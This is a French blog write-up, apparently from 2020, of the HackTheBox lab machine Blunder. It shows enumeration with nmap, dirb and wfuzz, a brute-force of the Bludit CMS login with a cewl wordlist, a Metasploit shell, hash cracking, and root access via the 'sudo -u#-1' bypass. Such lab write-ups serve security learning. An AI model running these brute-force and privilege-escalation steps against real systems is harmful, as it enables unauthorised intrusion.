<!DOCTYPE html>
<html lang="fr">
  <head>
    
      <title>Blunder :: AlrikRr - BlogPost — Bienvenue sur mon BlogPost</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Hello, aujourd&amp;rsquo;hui je vais vous présenter un Write-up de la Machine Blunder sur HackTheBox !
C&amp;rsquo;est une Machine EASY sous Linux :)
Il s&amp;rsquo;agit d&amp;rsquo;un Write-Up avec ma méthodologie, je ne suis en aucun cas un expert, je suis ici pour apprendre !
 Tools  Kali linux 2020 &#43; Tous les tools zsh pour le shell VirtualBox pour la VM sous Kali   NMAP Premièrement, un petit NMAP pour avoir un aperçu sur les PORTS et si possible des numéros de version."/>
<meta name="keywords" content="linux, tuto, programmation, python"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/writeup/blunder/" />





<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="/img/favicon.png">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Blunder"/>
<meta name="twitter:description" content="HackTheBox : Blunder"/>



<meta property="og:title" content="Blunder" />
<meta property="og:description" content="HackTheBox : Blunder" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/writeup/blunder/" />
<meta property="article:published_time" content="2020-07-30T10:13:24+02:00" />
<meta property="article:modified_time" content="2020-07-30T10:13:24+02:00" /><meta property="og:site_name" content="AlrikRr - BlogPost" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">AlrikRr - BlogPost</span>
    <span class="logo__cursor"></span>
  
</a>




    <span class="header__right">
      
        <nav class="menu">
	<ul class="menu__inner menu__inner--desktop">
    
      
        
	<li><a href="/tuto">Les Tutos</a></li>
        
      
        
	<li><a href="/secu">Sécurité</a></li>
        
      
        
	<li><a href="/writeup">Write-Up</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">
            Autres catégories
            <span class="menu__sub-inner-more-trigger-icon"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
          </li>

          <ul class="menu__sub-inner-more hidden">
            
              
	      <li><a href="/binary">Exploit-Binaire</a></li>
              
            
              
	      <li><a href="/iot">IOT</a></li>
              
            
              
	      <li><a href="/nixos">NIXOS</a></li>
              
            
              
	      <li><a href="/arch">Archlinux</a></li>
              
            
              
	      <li><a href="/ml">MachineLearning</a></li>
              
            
              
	      <li><a href="/about">A propos !</a></li>
              
            
          </ul>
        </ul>
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/tuto">Les Tutos</a></li>
      
    
      
        <li><a href="/secu">Sécurité</a></li>
      
    
      
        <li><a href="/writeup">Write-Up</a></li>
      
    
      
        <li><a href="/binary">Exploit-Binaire</a></li>
      
    
      
        <li><a href="/iot">IOT</a></li>
      
    
      
        <li><a href="/nixos">NIXOS</a></li>
      
    
      
        <li><a href="/arch">Archlinux</a></li>
      
    
      
        <li><a href="/ml">MachineLearning</a></li>
      
    
      
        <li><a href="/about">A propos !</a></li>
      
    
  </ul>
</nav>


        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title"><a href="/writeup/blunder/">Blunder</a></h1>
    <div class="post-meta">
      
        <span class="post-date">
          30-07-2020
        </span>

        
      

      <span class="post-author">— Ecrit par AlrikRr</span>
      
        <span class="post-read-time">— 4 Minutes</span>
      
    </div>

    

    
      
        <img src="/img/fr/writeup/blunder/htb-blunder.png" class="post-cover" />
      
    

    <div class="post-content">
      
      <p><img src="/img/fr/writeup/blunder/blunder.png" alt="blunder"></p>
<p>Hello, aujourd&rsquo;hui je vais vous présenter un Write-up de la Machine Blunder sur HackTheBox !</p>
<p>C&rsquo;est une Machine EASY sous Linux :)</p>
<p>Il s&rsquo;agit d&rsquo;un Write-Up avec ma méthodologie, je ne suis en aucun cas un expert, je suis ici pour apprendre !</p>
<hr>
<h1 id="tools">Tools</h1>
<ul>
<li>Kali linux 2020 + Tous les tools</li>
<li>zsh pour le shell</li>
<li>VirtualBox pour la VM sous Kali</li>
</ul>
<hr>
<h2 id="nmap">NMAP</h2>
<p>Premièrement, un petit NMAP pour avoir un aperçu sur les PORTS et si possible des numéros de version.<br>
<code>sudo nmap -v -sS -A -T5 10.10.10.191</code></p>
<pre><code class="language-bash/shell" data-lang="bash/shell">PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA
|_http-generator: Blunder
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
</code></pre><p>On peut voir un port FTP, intéressant, on va regarder s&rsquo;il est possible de s&rsquo;y connecter en <strong>ANONYMOUS</strong>.</p>
<pre><code class="language-bash/shell" data-lang="bash/shell">ヤマト» ftp 10.10.10.191            
ftp: connect: Connection refused
ftp&gt; 
</code></pre><p>Bon apparemment non.<br>
ALlons regarder le site web de plus près.</p>
<h2 id="site-web">Site Web</h2>
<p>A première vue, il n&rsquo;y a rien de très intéressant, je vais utiliser <code>dirb</code> pour trouver des pages &ldquo;cachées&rdquo;.<br>
J&rsquo;utilise la wordlist <code>medium.txt</code>.</p>
<p><img src="/img/fr/writeup/blunder/dirb.png" alt="dirb"></p>
<p>A première vu ca ressamble à un CMS, on va regarder les CVE du CMS mais avant ça il me faut le nom du CMS.</p>
<p><code>http://10.10.10.191/admin/ </code></p>
<p><strong>BLUDIT</strong></p>
<p>Après quelques recherches de CVE je suis tombé sur ce github : <a href="https://github.com/pingport80/CVE-2019-17240">pingport80/CVE-2019-17240</a></p>
<p>On va déjà tester un BRUTEFORCE sur le compte admin, en sachant que je ne suis pas sur que le compte admin existe, en regardant la doc BLUDIT c&rsquo;est un compte par défaut.</p>
<p><code>python3 brute.py -u http://10.10.10.191 -user admin -w /usr/share/wordlists/rockyou.txt</code></p>
<p><img src="/img/fr/writeup/blunder/brute_1.png" alt="brute_1"></p>
<p>Après quelques minutes j&rsquo;ai arrété le BRUTEFORCE, ca ne sert à rien de percister sur HackTheBox avec ce genre de technique.</p>
<p>Il s&rsquo;agit de BLUDIT 3.9.2, on peut regarder les exploit avec <code>searchsploit</code>.</p>
<p><img src="/img/fr/writeup/blunder/searchsploit.png" alt="searchploit"></p>
<h2 id="petite-pause">Petite Pause</h2>
<p>Bon reprenons, je suis sur qu&rsquo;il nous faut utiliser un exploit CVE mais pour ça il nous faut d&rsquo;abord un LOGIN et un MOT DE PASSE pour l&rsquo;utiliser.</p>
<p>Je suis allé faire un tour sur le forum HackTheBo pour avoir quelques HINTS.</p>
<p>Il y aurait un fichier texte important à trouver.</p>
<p>Pour ça, j&rsquo;utilise <code>WFUZZ</code>.</p>
<p>Je prends direct la wordlist <strong>BIG</strong>.</p>
<p><code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/big.txt --hc 404,403 -u &quot;http://10.10.10.191/FUZZ.txt&quot; -t 100 </code></p>
<p><img src="/img/fr/writeup/blunder/wfuzz.png" alt="wfuzz"></p>
<p>BINGO il y a une fichier <code>todo.txt</code> !</p>
<pre><code>-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
</code></pre><p>fergus ? Peut-être un nom d&rsquo;utilisateur ?</p>
<p>Je recommence avec l&rsquo;outil <strong>BRUTE</strong> de tout à l&rsquo;heure.</p>
<p>Non toujours rien.</p>
<p>Je suis tombé sur un exploit de BLUDIT : <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">bludit-brute-force-mitigation-bypass/</a></p>
<p>Mais il nous manque toujours le mot de passe.</p>
<h2 id="wordlist">Wordlist</h2>
<p>Après avoir essayé toutes les wordlists possible, je suis tombé sur l&rsquo;outil <code>cewl</code> qui permet de générer une wordlist personnalisé.</p>
<p><code>$ cewl -w dl_wordlists.txt -d 10 -m 1 http://10.10.10.191/</code></p>
<p><strong>Pas moyn de faire fonctionne le script du lien précédent, je reprends BRUTE</strong></p>
<p><code>python3 brute.py -u http://10.10.10.191/ -user fergus -w ~/Documents/HTB/blunder/dl_wordlist.txt</code></p>
<p>TROUVE !</p>
<p><code>fergus : RolandDeschain  ==&gt;found</code></p>
<h2 id="msf">MSF</h2>
<p>Maintenant que j&rsquo;ai un login et un mot de passe, je peux tester l&rsquo;exploit de la CVE avec msfconsole.</p>
<p><img src="/img/fr/writeup/blunder/msf.png" alt="msf"></p>
<p>J&rsquo;ai du m&rsquo;y reprendre à deux fois car j&rsquo;avais oublié de set le PAyload avec mon IP VPN.</p>
<p>Cet exploit me permet d&rsquo;avoir un shell sur la machine. ENFIN !</p>
<h2 id="shell">Shell</h2>
<p>En fouillant <code>/var/www/bludit-3.9.2/bl-content/databases</code> on se retrouve avec pleins de fichiers php.</p>
<p>Le plus intéressant est le fichier <code>users.php</code> qui contient un hash et un salt d&rsquo;un compte <strong>admin</strong>.</p>
<p>On identifie le Hash avec l&rsquo;outils <code>hash-identifier</code></p>
<pre><code class="language-bash/shell" data-lang="bash/shell">ヤマト» hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
---------------------------------------------------
 HASH: bfcc887f62e36ea019e3295aafb8a3885966e265

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

</code></pre><p>Pour trouvé le mot de passe j&rsquo;ai utilisé le site : <a href="https://md5hashing.net/">md5hashing.net</a></p>
<p>le mot de passe est : <code>Password120</code></p>
<h2 id="user">USER</h2>
<p>Dans le home de la machine on peut voir 2 users : <code>hugo</code> et <code>shaun</code></p>
<p>Essayons le mot de passe pour le compte hugo ?</p>
<pre><code class="language-bash/shell" data-lang="bash/shell">su hugo
Password: Password120
id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
</code></pre><p>BOUM un accès USER avec un flag !</p>
<p>On fait spawn un bash plus sympa avec : <code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' </code></p>
<h2 id="root">ROOT</h2>
<p>EN faisaint un <code>sudo -l</code> on peut voir <code> (ALL, !root) /bin/bash</code> ce qui est très étrange.</p>
<p>Après une petite recherche sur exploit-db je suis tombé sur cet exploit</p>
<p><a href="https://www.exploit-db.com/exploits/47502">exploits/47502</a></p>
<p>Du coup il suffit de taper cette commande :
<code>sudo -u#-1 /bin/bash</code></p>
<p>Nous voila root !</p>

    </div>
    


    
      
    

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">@AlrikRr - 2020</div>
    
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>


      
    </div>

    
  </body>
</html>
